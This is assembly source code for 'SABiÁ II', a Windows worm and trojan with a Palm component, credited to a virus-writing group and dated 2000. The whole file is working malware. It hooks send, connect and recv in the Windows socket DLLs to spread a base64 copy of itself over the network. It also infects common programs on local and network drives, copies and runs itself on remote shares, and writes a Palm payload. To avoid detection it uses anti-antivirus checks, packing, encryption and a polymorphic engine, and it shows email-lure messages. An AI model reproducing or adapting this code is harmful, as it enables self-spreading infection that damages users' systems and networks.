   ; Trojan/I-Worm/Palm/Wm/W32.SABiÁ II
   ; 
   ; by: NBK & Ultras / MATRiX
   ; (c) 2000

   .586p
   .model flat
   .code
   jumps

   FIRST_VERSION_KERNEL equ 0bff70000h

   DEBUG  EQU TRUE   ;  FALSE = LIVE VIRUS
   ;RING_0 EQU X     ;  IFDEF, NO DEBUGGERS CAN STAY ACTIVE (W9x)
   NO_INFECT_AV EQU X;  IFDEF, AVOID TO INFECT FILEZ WITH CERTAIN CHARS (AV CHARS)
   ;NETCRYPT EQU X    ;  IFDEF, ENCRYPT ALL VIRAL CODE/DATA IN WSOCK/WS2_-32.DLL'S
   ;WININIT EQU X    ;  IFDEF, CREATE WININIT.INI FILE (DEBUG FLAG INDEPENDENT)

   include _param.INC

   _entry:

   call init_junk

   fsize dd 0
   include _palm.INC    ;  (c)Ultras
   include _pack.INC    ;  (c)Kamaileon/Vecna original idea
   include _import.INC
   include _anti-av.INC ;  (c)Z0MBiE
   include _kme32.INC   ;  (c)Vecna/Z0MBiE
   include _base64.INC  ;  (c)Vecna
db 'L_INI'
   include _loader.INC
db 'L_END'

   init_junk:

   cld
   pop eax
   call rnd_init

   IF DEBUG EQ FALSE

   push offset worm@error
   push dword ptr fs:[0]
   mov fs:[0], esp

   ENDIF

   call get_crt_v_name
   lea eax, [eax+offset w_buffer@001]
   cmp [eax-4], 'PMT.'
   je reboot
   cmp [eax-4], 'LLD.'
   jne reboot
   push offset mutex@001
   push TRUE
   push 00100000h
   call call_OpenMutexA
   test eax, eax
   jnz call_ExitProcess

   ; critical section...

   IFDEF RING_0

   push offset debug@error
   push dword ptr fs:[0]
   mov fs:[0], esp
   call callring0
   jmp debug@error + 4

   debug@error:

   mov esp, [esp+8]
   pop dword ptr fs:[0]
   pop eax

   ENDIF

   call set_file_mem
   test eax, eax
   jz final
   push offset mutex@001
   push TRUE
   push NULL
   call call_CreateMutexA
   mov [w_mutex@002], eax

   IF DEBUG EQ TRUE

   push 0
   call $+5+37
   db 'THIS IS THE CURRENT VIRUS FILE NAME:',0
   push offset w_buffer@005
   push 0
   call call_MessageBoxA

   ENDIF

   push [fsize2]
   push 40h
   call call_GlobalAlloc
   mov [w_handle@013], eax
   test eax, eax
   jz final
   push 0
   push offset workmem
   push [fsize2]  ;  [fsize]
   push [w_handle@013]  ;  where to compress
   push [m_handle@001]  ;  [w_handle@011]  ;  where it starts
   call _ap_pack
   mov [w_handle@014], eax
   test eax, eax
   jz final

   worm@000 proc

   push offset worm@001
;   push [w_handle@011]
;   push [fsize]
;   push offset call_GetModuleHandleA
;   push offset call_GetProcAddress
;   call infect_arj               ;   (c)Vecna
   ret

   get_crt_v_name:

   push 0
   call call_GetModuleHandleA
   push 260
   push offset w_buffer@001
   push eax
   call call_GetModuleFileNameA
   push eax
   push offset w_buffer@001
   push offset w_buffer@005
   call call_lstrcpyA
   pop eax
   ret

   reboot:

   cmp [eax-4], 'PMT.'
   je reboot_x

   IF DEBUG EQ FALSE

   call call_GetUserDefaultLCID ;GetSystemDefaultLangID
   sub al, 16h
   jnz msg_english
   push 0
   call $+5+34
   db 'Gostou da mensagem no seu email ?',0
   call $+5+39
   db 'Pois entao visite www.meuamigo.cjb.net',0
   push 0
   call call_MessageBoxA
   jmp reboot_x

   msg_english:

   push 0
   call $+5+41
   db 'Do you like this message in your email ?',0
   call $+5+30
   db 'So visit www.mybestfriend.com',0
   push 0
   call call_MessageBoxA

   ENDIF

   reboot_x:

   push offset mutex@001
   push TRUE
   push 00100000h
   call call_OpenMutexA
   test eax, eax
   jnz call_ExitProcess
   push MAX_PATH
   push offset w_buffer@001
   call call_GetSystemDirectoryA
   test eax, eax
   jz try_temp
   call .tmp_name
   jz try_temp
   call copy_tmp_file
   jnz try_temp
   call f_exec
   push 0
   call call_ExitProcess

   try_temp:

   push 0
   push offset w_buffer@001
   push MAX_PATH
   call call_GetTempPathA
   test eax, eax
   jz call_ExitProcess
   call .tmp_name
   jz call_ExitProcess
   call copy_tmp_file
   jnz call_ExitProcess
   call f_exec
   call call_ExitProcess

   copy_tmp_file:

   push offset w_buffer@001
   call _lstrlen
   lea eax, [eax+offset w_buffer@001]
   sub [eax-4], - ('LLD.' - 'PMT.')
   push FALSE
   push offset w_buffer@001
   push offset w_buffer@005
   call call_CopyFileA
   dec eax
   ret

   .tmp_name:

   call rnd
   mov ebx, eax
   and eax, 0f0f0f0fh
   add eax, 'AAAA'
   push 0
   push eax
   mov eax, esp
   push offset w_buffer@001
   push ebx
   push eax
   push offset w_buffer@001
   call call_GetTempFileNameA
   sub esp, -(4*2)
   test eax, eax
   ret

   worm@000 endp

   worm@001 proc

   jmp worm@003
   ;jmp worm@004
   ;jmp worm@005

   ; secao critica...

   push offset inet@error
   push dword ptr fs:[0]
   mov fs:[0], esp
   push offset w_handle@010
   call call_GetSystemTime
   push 'LLD'
   push '.TEN'
   push 'INIW'
   push esp
   call call_LoadLibraryA
   sub esp, -(3*4)
   test eax, eax
   jz inet@002
   push eax
   pop [WININET]

   ;InternetGetConnectedState

   push 'e'
   push 'tatS'
   push 'detc'
   push 'enno'
   push 'CteG'
   push 'tenr'
   push 'etnI'
   push esp
   push eax
   call call_GetProcAddress
   mov [ap_InternetGetConnectedState], eax
   sub esp, -(7*4)
   test eax, eax
   jz inet@002
   push eax
   mov eax, esp
   push 0
   push eax
   call [ap_InternetGetConnectedState]
   pop ecx
   test eax, eax
   jz inet@002
   sub eax, eax
   cmp [download], eax  ;  done ?
   jne inet@002

   ;  NET HERE

   jmp short inet@002

   inet@error:

   mov esp, [esp+8]

   inet@002:

   push [WININET]
   pop eax
   test eax, eax
   jz inet@003
   push [WININET]
   call call_FreeLibrary

   inet@003:

   pop dword ptr fs:[0]
   pop eax

   worm@001 endp

   worm@002 proc

   sub eax, eax
   cmp [sfc], eax
   jnz sfc_not_found
   push 'LLD'
   push '.CFS'
   push esp
   call call_LoadLibraryA
   pop ecx ecx
   mov [sfc], eax
   test eax, eax
   jz sfc_not_found
   push 'de'
   push 'tcet'
   push 'orPe'
   push 'liFs'
   push 'IcfS'
   push esp
   push [sfc]
   call call_GetProcAddress
   sub esp, -(4*5)
   mov [SfcIsFileProtected], eax
   test eax, eax
   jnz sfc_not_found
   push [sfc]
   call call_FreeLibrary

   sfc_not_found:

   ; let's try to infect filez via TMAPI.DLL   (c)Vecna

   call system@001

   test eax, eax
   jz worm@003
   push 'L'
   push 'LD.I'
   push 'PAMT'
   push esp
   call call_LoadLibraryA
   sub esp, -(4*3)
   mov [tmapix], eax
   test eax, eax
   jz worm@003
   push 'elb'
   push 'aTmT'
   push 'tinI'
   push esp
   push [tmapix]
   call call_GetProcAddress
   sub esp, -(4*3)
   mov [InitTmTable], eax
   test eax, eax
   jz worm@003
   push 'xed'
   push 'nIyB'
   push 'tnem'
   push 'elEm'
   push 'TteG'
   push esp
   push [tmapix]
   call call_GetProcAddress
   sub esp, -(5*3)
   mov [GetTmElementByIndex], eax
   test eax, eax
   jz worm@003
   push 0
   push 'elba'
   push 'TmTe'
   push 'solC'
   push esp
   push [tmapix]
   call call_GetProcAddress
   sub esp, -(4*4)
   mov [CloseTmTable], eax
   test eax, eax
   jz worm@003
   call [InitTmTable]
   sub edi, edi

   procura@001:

   push offset w_buffer@001
   push edi
   call [GetTmElementByIndex]
   inc edi
   call infectar@001
   test eax, eax
   jnz procura@001
   call [CloseTmTable]
   jmp worm@003

   worm@002 endp

   worm@003 proc

   sub eax, eax
   cmp [tmapix], eax
   jz no_unload
   push [tmapix]
   call call_FreeLibrary

   no_unload:

   call system@001
   test eax, eax
   jz worm@004

   push 260
   mov edi, offset w_buffer@001
   push edi
   call call_GetSystemDirectoryA
   test eax,eax
   jz worm@004
   add edi,eax
   push 'LLD'
   push '.23_'
   push '2SW\'
   mov esi, esp
   lea eax, [esp+1]
   push eax
   push (4*3)
   pop ecx
   rep movsb
   call call_LoadLibraryA
   sub esp, -(4*3)
   test eax, eax
   jz wsock32@004
   mov [wsock32_addr], eax
   call wsock32@003
   push [wsock32_addr]
   call call_FreeLibrary
   jmp worm@004   ;   WS2_32.DLL is infected, we don't
                  ;   need WSOCK32.DLL
   wsock32@004:

   push 260
   mov edi, offset w_buffer@001
   push edi
   call call_GetSystemDirectoryA
   test eax,eax
   jz worm@004
   add edi,eax
   push 0
   push 'LLD.'
   push '23KC'
   push 'OSW\'
   mov esi, esp
   lea eax, [esp+1]
   push eax
   push (4*4)
   pop ecx
   rep movsb
   call call_LoadLibraryA
   sub esp, -(4*4)
   test eax, eax
   jz worm@004
   mov [wsock32_addr], eax
   call wsock32@003
   push [wsock32_addr]
   call call_FreeLibrary
   jmp worm@004

   wsock32@003:

   mov [w_handle@012], eax
   push 'tce'
   push 'nnoc'
   push esp
   push [wsock32_addr]
   call call_GetProcAddress
   sub esp, -(4*2)
   test eax, eax
   jz wsock32@001
   push 'SII'
   push 0
   push 0
   push 0
   call eax
   pop eax
   cmp eax, 'SII'
   jne wsock32@001
   call w_IOB@001

   IF DEBUG EQ TRUE

   pushad
   push 1
   call $+5+32
   db 'CAN I TRY TO INFECT THIS FILE ?',0
   push offset w_buffer@001
   push 0
   call call_MessageBoxA
   cmp eax, 2
   popad
   je wsock32@005

   ENDIF

   push offset w_buffer@001
   push offset w_buffer@006
   call call_lstrcpyA
   push offset w_buffer@006
   call _lstrlen
   sub dword ptr [w_buffer@006+eax-4], - ('---.' - 'LLD.')
   push FALSE
   push offset w_buffer@006
   push offset w_buffer@001
   call call_CopyFileA
   push offset w_buffer@006
   push offset w_buffer@001
   call call_lstrcpyA
   call w_IO@001
   mov esi, eax
   test eax, eax
   jz wsock32@005
   mov edi,[esi+60]
   mov [ntpe],edi
   add esi,edi
   movzx eax,word ptr [esi+6]
   mov [convert@004],eax   ;   number of sections
   mov ebx,[esi+52]
;   mov [base],ebx   ;   Base adress   ;  error

   push [wsock32_addr]
   pop [base]

   mov eax, [esi+80]
   lea eax, [eax*2]
   mov [esi+80], eax
   mov eax, esi
   movzx ecx, word ptr [eax+20]
   add eax, ecx
   lea eax, [eax+24]
   mov [convert@005], eax   ;   sections start
   mov ecx, [convert@004]
   dec ecx
   imul ecx, 40
   or [eax+36],0C0000000H
   add eax, ecx   ;   last section
   mov ebx,[eax+8]
   push dword ptr [eax+20]
   push dword ptr [eax+16]
   mov ecx,ebx
   add ecx, (offset trojan@002 - offset trojan@001)
   add ecx, [fsize3]
   call mem
   mov [eax+8],ebx
   mov ebx,[eax+16]
   mov ecx,ebx
   mov edx, ebx
   add ecx, [fsize3]
   add ecx, (offset trojan@002 - offset trojan@001)
   call mem
   mov [eax+16],ebx
   mov edi,[eax+20]
   add edi, edx
   or [eax+36],0C0000000H
   mov eax, [fsize3]
   add eax, (offset trojan@002 - offset trojan@001)
   add [w_handle@002], eax
   pop eax
   pop ebx
   add eax, ebx    ;    RVA
   mov [rva], eax
   mov [raw], edi
   mov esi, [w_handle@004]
   mov eax, 12345678h
   org $-4
   ntpe dd 0
   add eax, 120
   mov eax, [eax+esi]
   call convert@001
   add eax,28
   mov eax, [eax+esi]   ;   get offset
   call convert@001
   mov ebx,12345678h
   org $-4
   rva dd 0
   lea edi, [eax+esi]
   mov ebp, [wsock32_addr]
   push 0
   push 'dnes'
   push esp
   push ebp
   call call_GetProcAddress
   sub esp, -(2*4)
   test eax, eax
   jz wsock32@001
   mov [ap_send], eax
   sub eax, [base]
   mov [_send_2_ch], eax
   push 'tce'
   push 'nnoc'
   push esp
   push ebp
   call call_GetProcAddress
   sub esp, -(2*4)
   test eax, eax
   jz wsock32@001
   mov [ap_connect], eax
   sub eax, [base]
   mov [_connect_2_ch], eax
   push 0
   push 'vcer'
   push esp
   push ebp
   call call_GetProcAddress
   sub esp, -(2*4)
   test eax, eax
   jz wsock32@001
   mov [ap_recv], eax
   sub eax, [base]
   mov [_recv_2_ch], eax
   add ebx, 12345678h
   org $-4
   base dd 0
   mov edi, 12345678h
   org $-4
   raw dd 0

   ; replace instructions

   mov esi, [_send_2_ch]
   add esi, [w_handle@004]
   mov edi, offset orig_send_byte
   movsd
   movsd
   xchg esi, edi
   sub edi, 8
   push edi
   mov al, 0e9h   ;  jmp
   stosb
   mov eax, [rva]
   sub eax, [_send_2_ch]
   sub eax, 5
   stosd ;  xxx
   pop esi
   mov edi, offset jump_send_byte
   push 8
   pop ecx
   cld
   rep movsb
   mov esi, [_connect_2_ch]
   add esi, [w_handle@004]
   mov edi, offset orig_connect_byte
   movsd
   movsd
   xchg esi, edi
   sub edi, 8
   push edi
   mov al, 0e9h
   stosb
   mov eax, [rva]
   add eax, (offset trojan@003 - offset trojan@001)
   sub eax, [_connect_2_ch]
   sub eax, 5
   stosd
   pop esi
   mov edi, offset jump_connect_byte
   push 8
   pop ecx
   cld
   rep movsb
   mov esi, [_recv_2_ch]
   add esi, [w_handle@004]
   mov edi, offset orig_recv_byte
   movsd
   movsd
   xchg esi, edi
   sub edi, 8
   push edi
   mov al, 0e9h
   stosb
   mov eax, [rva]
   add eax, (offset trojan@005 - offset trojan@001)
   sub eax, [_recv_2_ch]
   sub eax, 5
   stosd
   pop esi
   mov edi, offset jump_recv_byte
   push 8
   pop ecx
   cld
   rep movsb

   ; save api's to be used by wsock32 loader

   mov edi, offset wsock_api
   call kernel_txt_api

   db 'GlobalAlloc',0
   db 'IsBadReadPtr',0
   db 'GetSystemTime',0
   db 'ExitProcess',0,0ffh

   kernel_txt_api:

   pop esi
   push 0
   push 'LLD.'
   push '23LE'
   push 'NREK'
   push esp
   call call_GetModuleHandleA
   sub esp, -(4*4)
   mov ebp, eax
   test eax, eax
   jz wsock32@001
   call api_txt_all
   call wsock_txt_api

   db 'recv',0
   db 0ffh

   wsock_txt_api:

   pop esi
   mov ebp, [wsock32_addr]
   call api_txt_all
   mov ebx, [w_handle@004]
   sub [convert@005], ebx
   call w_IOB@001
   call w_IO@001
   mov ebx, [w_handle@004]
   add [convert@005], ebx
   db 0e8h
   dd (offset trojan@002 - offset trojan@001)

   include _winsock.INC

   mov edi, [raw]
   add edi, [w_handle@004]
   pop esi
   mov ecx, (offset trojan@002 - offset trojan@001)
   rep movsb

   ; convert SABiÁ-II to base64

   mov esi, [w_handle@011]
   mov eax, [fsize]
   call BASE64
   mov [edi-4], ecx
   mov esi, [w_handle@004]
   mov edx, esi
   add esi, [raw]
   add edx, [w_handle@002]
   sub edx, 20
   push esi
   add esi, (offset rnd_crypt - offset trojan@001)
   call rnd
   mov [esi], eax
   mov edi, esi
   push esi

   IFDEF NETCRYPT

   lodsd
   not eax
   mov ebx, eax
   stosd

   wsock32_crypt_partial:

   lodsd
   xor eax, ebx
   stosd
   mov ebx, eax
   cmp esi, edx
   jb wsock32_crypt_partial

   ENDIF

   pop esi
   call rnd
   push eax
   pop ebp
   xchg [esi], ebp
   sub edx, esi
   mov eax, edx
   sub edx, edx
   mov ecx, 4
   div ecx
   sub edx, edx

   ; resultado em eax

   pop esi
   mov [esi+(offset dword_wsock_de - offset trojan@001)], eax
   xchg [esi+(offset dword_wsock_de2 - offset trojan@001)], ebp   ;   change keys
   sub esp, MAX_PATH
   mov edi, esp
   mov ebx, edi
   push MAX_PATH
   push edi
   call call_GetWindowsDirectoryA
   add edi, eax
   push 0
   push 'INI.'
   push 'TINI'
   push 'NIW\'
   mov esi, esp
   mov ecx, 13
   rep movsb
   sub esp, -(4*4)

   IFDEF WININIT

   xor eax, eax
   push eax
   push eax
   push 2   ;   CREATE_ALWAYS
   push eax
   inc eax
   push eax
   push GENERIC_READ or GENERIC_WRITE
   push ebx
   call call_CreateFileA
   mov esi, eax
   inc eax
   jz wsock32@006

   ; [Rename],13,10

   push 0a0dh
   push ']ema'
   push 'neR['
   mov edi, esp
   mov edx, 10
   call write_file
   sub esp, -(4*3)
   mov edi, offset w_buffer@001
   push edi
   call _lstrlen
   mov edx, eax
   lea eax, [edi+eax]
   sub [eax-4], -('LLD.' - '---.')
   mov byte ptr [eax], '='
   inc edx
   call write_file
   mov edi, offset w_buffer@006
   push edi
   call _lstrlen
   mov edx, eax
   call write_file
   push esi
   call call_CloseHandle

   ENDIF

   wsock32@006:

   sub esp, -MAX_PATH

   IF DEBUG EQ TRUE

   push offset w_buffer@001
   call _lstrlen
   mov byte ptr [offset w_buffer@001 + eax - 1], 0

   push 0
   call @wsock
   db 'THIS FILE WAS INFECTED:',0
   @wsock:
   push offset w_buffer@006
   push 0
   call call_MessageBoxA

   ENDIF

   wsock32@001:

   call w_IOB@001

   wsock32@005:

   ret

   write_file:

   xor eax, eax
   push eax
   mov ecx, esp
   push eax
   push ecx
   push edx   ;   number of bytes to write
   push edi
   push esi
   call call_WriteFile
   pop eax
   ret

   wsock32@002:

   pop eax
   jmp wsock32@001

   mem:

   lea ebx, [ebx*2]
   cmp ebx, ecx
   jbe mem
   ret

   api_txt_all:

   push esi
   push ebp
   call call_GetProcAddress
   stosd
   test eax, eax
   jz wsock32@002

   api_txt_zero:

   lodsb
   test al, al
   jnz api_txt_zero
   cmp byte ptr [esi], 0ffh
   jne api_txt_all
   ret

   worm@003 endp

   worm@004 proc

   ;   Looking for net/comun programs

   push 0
   push 'LLD.'
   push 'PLHE'
   push 'GAMI'
   push esp
   call call_LoadLibraryA
   sub esp, -(4*4)
   mov [IMAGEHLP], eax
   test eax, eax
   jz worm@004_no_unl
   push 'e'
   push 'liFr'
   push 'oFee'
   push 'rThc'
   push 'raeS'
   push esp
   push eax
   call call_GetProcAddress
   sub esp, -(4*5)
   mov [ap_SearchTreeForFile], eax
   test eax, eax
   jz worm@004_unl
   push offset w_buffer@004
   push 4096
   call call_GetLogicalDriveStringsA
   test eax, eax
   jz worm@004_unl
   cmp eax, 4096
   ja worm@004_unl
   mov esi, offset w_buffer@004

   nxt_string1:

   push esi
   call call_GetDriveTypeA
   cmp eax, DRIVE_FIXED
   je worm@004_pop_prog
   cmp eax, DRIVE_REMOTE
   jne nxt_string2

   worm@004_pop_prog:

   push eax
   push esi
   call call_SetCurrentDirectoryA

   ;   Infect some popular prog's

   push esi
   mov esi, (offset array@001 - 1)
   inc esi
   mov ecx, (offset array@002 -  offset array@001)/4

   comun@003:

   cld
   lodsd
   mov ebx, [esp]
   push ecx
   push offset w_buffer@001
   push eax
   push ebx
   call [ap_SearchTreeForFile]
   test eax, eax
   jz comun@004
   call infectar@001

   comun@004:

   pop ecx
   loop comun@003
   pop esi
   pop eax
   cmp eax, DRIVE_REMOTE
   jne nxt_string2

   ; copy worm to remote drive and play it

   push esi
   mov edi, offset w_buffer@001
   push edi
   call call_lstrcpyA
   push edi
   call _lstrlen
   add edi, eax
   cmp byte ptr [edi-1], '\'
   je avd_back
   mov al, '\'
   stosb

   avd_back:

   mov eax, '.2-S'   ;   SABIá II
   stosd
   mov eax, 'EXE'
   stosd
   push FALSE
   push offset w_buffer@001
   push offset w_buffer@005
   call call_CopyFileA
   push offset nxt_string2

   IF DEBUG EQ FALSE

   test eax, eax
   jnz f_exec

   ENDIF

   ret

   f_exec:

   push FILE_ATTRIBUTE_HIDDEN or FILE_ATTRIBUTE_ARCHIVE
   push offset w_buffer@001
   call call_SetFileAttributesA
   push offset handle@010
   call call_GetStartupInfoA
   push offset handle@011
   push offset handle@010
   push NULL
   push NULL
   push 20h   ;   NORMAL_PRIORITY_CLASS
   push FALSE
   push NULL
   push NULL
   push NULL
   push offset w_buffer@001
   call call_CreateProcessA
   dec eax
   ret

   nxt_string2:

   push esi
   call _lstrlen
   test eax, eax
   jz worm@004_unl
   lea esi, [esi+eax+1]
   cmp byte ptr [esi], 0
   jne nxt_string1

   worm@004_unl:

   push [IMAGEHLP]
   call call_FreeLibrary

   worm@004_no_unl:

   worm@004 endp

   worm@005 proc

   ; .tmp filez

   push offset w_buffer@005
   call _lstrlen
   push eax
   lea eax, [eax+offset w_buffer@005]
   cmp [eax-4], 'PMT.'
   je worm@005_prc
   push offset w_buffer@005
   push offset w_buffer@001
   call call_lstrcpyA
   pop eax
   lea eax, [eax+offset w_buffer@001]
   mov [eax-4], 'PMT.'
   push offset w_buffer@001
   call call_DeleteFileA

   worm@005_prc:

   ; .prc filez

   push 0
   push 'LLD.'
   push 'PLHE'
   push 'GAMI'
   push esp
   call call_LoadLibraryA
   sub esp, -(4*4)
   mov [IMAGEHLP], eax
   test eax, eax
   jz worm@005_esp
   push 'e'
   push 'liFr'
   push 'oFee'
   push 'rThc'
   push 'raeS'
   push esp
   push eax
   call call_GetProcAddress
   sub esp, -(4*5)
   mov [ap_SearchTreeForFile], eax
   test eax, eax
   jz worm@005_unl_hlp
   push MAX_PATH
   push offset w_buffer@001
   call call_GetWindowsDirectoryA
   test eax, eax
   jz worm@005_unl_hlp
   lea esi, [offset w_buffer@001+eax]
   push MAX_PATH
   pop ecx

   worm@005_get_drv:

   std
   lodsb
   sub al, ':'
   jz worm@005_drv
   loop worm@005_get_drv
   jmp worm@005_unl_hlp

   worm@005_drv:

   mov byte ptr [esi+3], al
   push offset w_buffer@001
   call call_SetCurrentDirectoryA
   sub esp, MAX_PATH
   mov edi, esp
   push 'C'
   push 'RP.P'
   push 'UTES'
   mov eax, esp
   push edi
   push eax
   push offset w_buffer@001
   call [ap_SearchTreeForFile]
   sub esp, -(3*4)
   test eax, eax
   jz worm@005_un_esp
   push MAX_PATH
   pop ecx
   push offset w_buffer@001
   pop esi
   cld
   xchg edi, esi
   rep movsb
   call w_IO@001
   mov [w_handle@002], 2506
   call w_IOB@001
   call w_IO@001
   mov edi, eax
   test eax, eax
   jz worm@005_un_esp
   push offset _palm
   pop esi
   push 2506
   pop ecx
   cld
   rep movsb
   call w_IOB@001

   worm@005_un_esp:

   sub esp, -MAX_PATH

   worm@005_unl_hlp:

   push [IMAGEHLP]
   call call_FreeLibrary

   worm@005_esp:

   worm@005 endp

   final:

   IF DEBUG EQ TRUE

   push 0
   call $+5+27
   db 'SABiÁ II OUT FROM MEMORY !',0
   push dword ptr [esp]
   push 0
   call call_MessageBoxA

   push 0
   call call_ExitProcess

   ELSE

   push 15 * 1000
   call call_Sleep
   jmp worm@000

   ENDIF

   worm@error:

   mov esp, [esp+8]
   pop dword ptr fs:[0]
   pop eax
   push offset worm@error
   push dword ptr fs:[0]
   mov fs:[0], esp

   IF DEBUG EQ TRUE

   push 0
   call $+5+16
   db 'PROGRAM ERROR !',0
   push offset w_ionumb@007
   push 0
   call call_MessageBoxA

   ENDIF

   jmp final

   set_file_mem:

   push offset w_buffer@005
   push offset w_buffer@001
   call call_lstrcpyA
   push offset w_buffer@002
   push offset w_buffer@001
   call call_FindFirstFileA
   dec eax
   jz set_file_mem_error
   inc eax
   push eax
   call call_FindClose
   push [w_buffer@002.nFileSizeLow]
   pop [fsize]
   push [fsize]
   pop eax
   imul eax, 3
   mov ecx, 2
   sub edx, edx
   div ecx
   push eax
   pop [fsize3]
   mov eax, [fsize]
   add eax, 1024
   push eax
   push 40h
   call call_GlobalAlloc
   mov [w_handle@011], eax
   test eax, eax
   jz set_file_mem_error
   mov [w_handle@012], eax ;  read mode
   call w_IO@001
   mov esi, eax
   test eax, eax
   jz set_file_mem_error
   mov edi, [w_handle@011]
   mov ecx, [fsize]
   rep movsb
   call w_IOB@001

   ;  sections rva (1000h multiply)
   ;  IT rva in PE + 80h (1000h multiply)
   ;  .idata header and fields
   ;  add muazzins sections (increase), random name

   ;  alloc fsize * 2

   mov eax, [fsize]
   lea eax, [eax*2]
   push eax
   push 40h
   call call_GlobalAlloc
   mov [m_handle@001], eax
   mov edi, eax
   test eax, eax
   jz set_file_mem_error

   ;  copy header and change it

   mov esi, [w_handle@011]
   push 504
   pop ecx
   rep movsb
   mov [m_handle@002], edi

   ;  choose new first section name

   call rnd
   and eax, 3
   push NULL
   push 'EDOC'
   jz .secnameok
   sub esp, -(4*2)
   dec eax
   push 'e'
   push 'doc.'
   jz .secnameok
   sub esp, -(4*2)
   push 't'
   push 'xet.'

   .secnameok:

   pop dword ptr [edi]
   pop dword ptr [edi+4]

   ;  let's pack the code...
   ;  entrypoint --> 400h offset (new file)

   mov edi, [m_handle@001]
   lea edi, [edi+400h]  ;  output

   push 0
   push offset workmem
   push (offset _main_loader_end - offset _entry)
   push edi ;  where to compress
   push offset _entry   ;  where it starts
   call _ap_pack

   ;  returns packed size

   mov [m_handle@003], eax
   test eax, eax
   jz set_file_mem_error

   mov ecx, FileAlignment   ;  alignment
   call ajustar_no_file

   ;  the new section size

   mov [m_handle@004], eax

   push eax
   mov eax, [m_handle@003]
   sub edx, edx
   mov ecx, 4
   div ecx
   mov ecx, eax
   mov esi, [m_handle@001]
   lea esi, [esi+400h]

   call rnd
   push eax eax
   pop [rnd_loader2_add] edx
   call rnd
   push eax eax
   pop [rnd_loader2_xor] ebx
   call rnd
   push eax
   pop [rnd_loader2_sub]

   push esi
   push ecx

   ;  encrypt the packed code (first level)

   l2_encrypt@001:

   add [esi], eax
   xor [esi], ebx
   sub [esi], edx
   add esi, 4
   loop l2_encrypt@001

   pop ecx
   pop esi

   ;  second encryption level

   call enc_by_first

   pop eax
   mov edi, [m_handle@002] ;  first section header...
   add [m_handle@002], 40  ;  point to next section
   mov [edi.SH_VirtualSize], 8000h
   mov [edi.SH_VirtualAddress], 1000h
   mov [edi.SH_SizeOfRawData], eax
   mov [edi.SH_PointerToRawData], 400h
   mov [edi.SH_Characteristics], GENERIC_READ OR GENERIC_WRITE OR GENERIC_EXECUTE OR 20h

   ;  and now repeat the operation with .data section
   ;  we've to pack only the "valid bytes" part

   call rnd
   mov edi, [m_handle@001]
   mov [(edi+256).NumberOfSections], S2_NumberOfSections
   mov [(edi+256).TimeDateStamp], eax
   mov [(edi+256+IMAGE_FILE_HEADER_SIZE).OH_SizeOfImage], SizeOfImage
   mov [(edi+256+IMAGE_FILE_HEADER_SIZE).OH_SectionAlignment], SectionAlignment
   mov [(edi+256+IMAGE_FILE_HEADER_SIZE).OH_FileAlignment], FileAlignment
   mov [(edi+256+IMAGE_FILE_HEADER_SIZE).OH_AddressOfEntryPoint], AddressOfEntryPoint

   lea edi, [edi+400h]
   add edi, [m_handle@004]
   mov ebp, edi

   push 0
   push offset workmem
   push (offset _fixed_data_s2 - offset v_name)
   push edi ;  output packed data
   push offset v_name ;  where starts to pack
   call _ap_pack
   mov [m_handle@005], eax
   test eax, eax
   jz set_file_mem_error

   do_file_header2:

   mov ecx, FileAlignment
   call ajustar_no_file
   mov [m_handle@006], eax

   push eax ebp
   mov eax, [m_handle@005]
   sub edx, edx
   mov ecx, 4
   div ecx
   mov ecx, eax

   call rnd
   push eax eax
   pop [rnd_loader2_add2] edx
   call rnd
   push eax eax
   pop [rnd_loader2_xor2] ebx
   call rnd
   push eax
   pop [rnd_loader2_sub2]
   push ebp
   push ecx

   l2_encrypt@002:

   add [ebp], eax
   xor [ebp], ebx
   sub [ebp], edx
   add ebp, 4
   loop l2_encrypt@002

   pop ecx
   pop esi
   call enc_by_first
   pop ebp eax
   add ebp, eax
   push eax

   mov edi, [m_handle@002] ;  make header
   push 'at'
   push 'adr.'
   call rnd
   and eax, 3
   jz opt_2_sec_ok
   sub esp, -(4*2)
   dec eax
   push 'at'
   push 'ads.'
   jz opt_2_sec_ok
   sub esp, -(4*2)
   push 'a'
   push 'tad.'

   opt_2_sec_ok:

   add [m_handle@002], 40
   pop dword ptr [edi]
   pop dword ptr [edi+4]
   pop eax
   mov [edi.SH_VirtualSize], 0A6000h
   mov [edi.SH_VirtualAddress], 9000h
   mov [edi.SH_SizeOfRawData], eax
   mov eax, [(edi-40).SH_PointerToRawData]
   add eax, [(edi-40).SH_SizeOfRawData]
   mov [edi.SH_PointerToRawData], eax
   mov [edi.SH_Characteristics], GENERIC_READ OR GENERIC_WRITE OR GENERIC_EXECUTE OR 40h

   ; copiar a .idata para lá...

   mov esi, [w_handle@011] ;  file in memory
   push esi
   lea esi, [esi+604]   ;  dword pointing where section starts
   lodsd
   pop esi
   xadd esi, eax
   mov edi, ebp
   push 512
   pop ecx
   add ebp, ecx
   rep movsb

   mov [m_handle@004], eax
   mov edi, [m_handle@002] ;  make .idata header
   add [m_handle@002], 40
   push 'at'
   push 'adi.'
   pop dword ptr [edi]
   pop dword ptr [edi+4]
   mov [edi.SH_VirtualSize], 1000h
   mov [edi.SH_VirtualAddress], idata_rva
   mov [edi.SH_SizeOfRawData], 200h
   mov eax, [(edi-40).SH_PointerToRawData]
   add eax, [(edi-40).SH_SizeOfRawData]
   mov [edi.SH_PointerToRawData], eax
   mov [edi.SH_Characteristics], GENERIC_READ OR GENERIC_WRITE OR 40h

   ;  polymorphic loader section

   sub eax, eax
   push offset _main_loader
   push _main_loader_size
   push _main_loader_size * 8
   push (_main_loader_size * 10) + 1024
   call do_poly
   jc set_file_mem_error

;  polymorphic code: +/- (36 * original_code)   ;)

;comment #

   push [w_ionumb@013]
   push [kme3_out_size]
   pop eax
   push eax
   lea eax, [eax*8]
   push eax
   add eax, 64 * 1024
   push eax
   call do_poly
   jc set_file_mem_error

;#

   mov esi, [w_ionumb@013]
   mov edi, ebp
   push [kme3_out_size]
   pop ecx
   rep movsb

   push [kme3_out_size]
   pop eax
   mov ecx, FileAlignment ;  alignment
   call ajustar_no_file
   mov [m_handle@007], eax

   add ebp, eax
   sub ebp, [m_handle@001]
   mov [fsize2], ebp

   mov edi, [m_handle@002] ;  make poly section's header
   add [m_handle@002], 40

   push NULL
   push 'ssb.'
   call rnd
   and eax, 3
   jz opt_4_sec_ok
   sub esp, -(4*2)
   push 'c'
   push 'rsr.'
   dec eax
   jz opt_4_sec_ok
   sub esp, -(4*2)
   push 'co'
   push 'ler.'

   opt_4_sec_ok:

   pop dword ptr [edi]
   pop dword ptr [edi+4]
   mov [edi.SH_VirtualSize], 10000h
